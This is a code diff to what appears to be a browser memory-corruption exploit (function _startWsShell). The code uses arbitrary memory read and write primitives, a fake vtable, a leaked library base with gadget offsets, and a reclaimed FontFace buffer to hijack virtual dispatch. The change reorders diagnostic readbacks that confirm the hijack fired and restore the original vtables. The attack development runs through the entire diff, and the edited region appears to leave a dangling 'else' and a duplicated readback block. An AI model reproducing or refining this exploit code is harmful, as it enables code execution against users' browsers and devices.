@@ -6273,35 +6273,8 @@ function _startWsShell(){
             for(var dI3=0;dI3<8;dI3++)S.absWrite(FAKEVT+BigInt(dI3*8),lkF+0x2C0n);
             FB2('D3 DIAG3: all slots=thr_self; the swap = FO+0x00 AND FO+0x20');
           }
-          if(isDiag4){
-            var cliNow=S.absRead(CLI,8)[0];
-            var cliVtNow=S.absRead(CLI-0x20n,8)[0];
-            FB2('D4 [cli]=0x'+cliNow.toString(16)+' [cli-0x20]=0x'+cliVtNow.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
-            reply.CLInow='0x'+cliNow.toString(16);
-            if(cliNow!==0n&&cliNow<0x100000n){FB2('D4 *** [cli] = tid '+cliNow.toString(10)+' - THE CLIENT DISPATCH FIRED ***');reply.dispatchProven=true;reply.tidWitness=Number(cliNow);}
-            S.absWrite(CLI-0x20n,c98Pre);
-            FB2('D4 client vtable restored (0x'+c98Pre.toString(16)+')');
-          } else if(isDiag3){
-            var fo0Now=S.absRead(FO,8)[0];
-            var fo20Now=S.absRead(FO+0x20n,8)[0];
-            FB2('D3 [FO+0]=0x'+fo0Now.toString(16)+' [FO+0x20]=0x'+fo20Now.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
-            reply.FO0now='0x'+fo0Now.toString(16);
-            reply.FO20now='0x'+fo20Now.toString(16);
-            if(fo0Now!==FAKEVT){FB2('D3 *** [FO+0] CHANGED - tid=0x'+fo0Now.toString(16)+' - THE DISPATCH FIRED ***');reply.dispatchProven=true;}
-            if(fo20Now!==FAKEVT){FB2('D3 *** [FO+0x20] CHANGED - tid=0x'+fo20Now.toString(16)+' - THE SECONDARY DISPATCH FIRED ***');reply.dispatchProven=true;reply.dispatchSecondary=true;}
-            S.absWrite(FO,vpOrig);
-            S.absWrite(FO+0x20n,fo20Pre);
-            FB2('D3 FO vtables restored');
-          } else if(isDiag2){
-            /* DIAG2: the FACE dispatch - ALL FAKEVT slots = thr_self;
-             * the swap targets MBUF+0x00 (primary) AND MBUF+0x20 (the
-             * secondary Client vtable - the corpus resolution: the leaked
-             * VP = FontFace's Client SECONDARY at +0x20; the property change
-             * dispatches fontPropertyChanged ON THE FACE = the reclaimed
-             * buffer = MBUF - ZigZagBoi1's exact RIP2 target) */
-            for(var dI=0;dI<8;dI++)S.absWrite(FAKEVT+BigInt(dI*8),lkF+0x2C0n);
-            FB2('D2 DIAG2: all slots=thr_self; the swap = MBUF+0x00 AND +0x20');
-          } else {
+          
+          else {
             var s3T=isDiag?(lkF+0x2C0n):(lkF+0x13ED0n);
             S.absWrite(FAKEVT+0x18n,s3T);
             if(isDiag)FB2('D DIAG: s3=lk+0x2C0');
@@ -6366,6 +6339,42 @@ function _startWsShell(){
            * may be synchronous - read immediately too) */
           var witPost=S.absRead(WIT,8)[0];
           FB2('9 witness imm 0x'+witPre.toString(16)+' -> 0x'+witPost.toString(16));
+          /* (8b) THE DIAG READBACKS (correctly after the trigger) */
+          if(isDiag4){
+            var cliNow=S.absRead(CLI,8)[0];
+            var cliVtNow=S.absRead(CLI-0x20n,8)[0];
+            FB2('D4 [cli]=0x'+cliNow.toString(16)+' [cli-0x20]=0x'+cliVtNow.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
+            reply.CLInow='0x'+cliNow.toString(16);
+            if(cliNow!==0n&&cliNow<0x100000n){FB2('D4 *** [cli] = tid '+cliNow.toString(10)+' - THE CLIENT DISPATCH FIRED ***');reply.dispatchProven=true;reply.tidWitness=Number(cliNow);}
+            S.absWrite(CLI-0x20n,c98Pre);
+            FB2('D4 client vtable restored');
+          } else if(isDiag3){
+            var fo0Now=S.absRead(FO,8)[0];
+            var fo20Now=S.absRead(FO+0x20n,8)[0];
+            FB2('D3 [FO+0]=0x'+fo0Now.toString(16)+' [FO+0x20]=0x'+fo20Now.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
+            reply.FO0now='0x'+fo0Now.toString(16);
+            reply.FO20now='0x'+fo20Now.toString(16);
+            if(fo0Now!==FAKEVT){FB2('D3 *** [FO+0] CHANGED - tid=0x'+fo0Now.toString(16)+' - THE DISPATCH FIRED ***');reply.dispatchProven=true;}
+            if(fo20Now!==FAKEVT){FB2('D3 *** [FO+0x20] CHANGED - tid=0x'+fo20Now.toString(16)+' - THE SECONDARY DISPATCH FIRED ***');reply.dispatchProven=true;reply.dispatchSecondary=true;}
+            S.absWrite(FO,vpOrig);
+            S.absWrite(FO+0x20n,fo20Pre);
+            FB2('D3 FO vtables restored');
+          } else if(isDiag2){
+            var mb0Now=S.absRead(MBUF,8)[0];
+            FB2('D2 [MBUF+0] now=0x'+mb0Now.toString(16));
+            reply.MBUF0now='0x'+mb0Now.toString(16);
+            if(mb0Now!==FAKEVT){FB2('D2 *** [MBUF] CHANGED - tid=0x'+mb0Now.toString(16)+' ***');reply.dispatchProven=true;}
+            S.absWrite(MBUF,mb0Pre);
+            S.absWrite(MBUF+0x20n,mb20Pre);
+            FB2('D2 MBUF vtables restored');
+          } else if(isDiag){
+            var foNow=S.absRead(FO,8)[0];
+            FB2('D [FO] now=0x'+foNow.toString(16));
+            reply.FOnow='0x'+foNow.toString(16);
+            if(foNow!==FAKEVT){FB2('D *** [FO] CHANGED - tid=0x'+foNow.toString(16)+' ***');reply.dispatchProven=true;}
+            S.absWrite(FO,vpOrig);
+            FB2('D FO.vtable restored');
+          }
           if(isDiag2){
             var mb0Now=S.absRead(MBUF,8)[0];
             FB2('D2 [MBUF+0] now=0x'+mb0Now.toString(16));
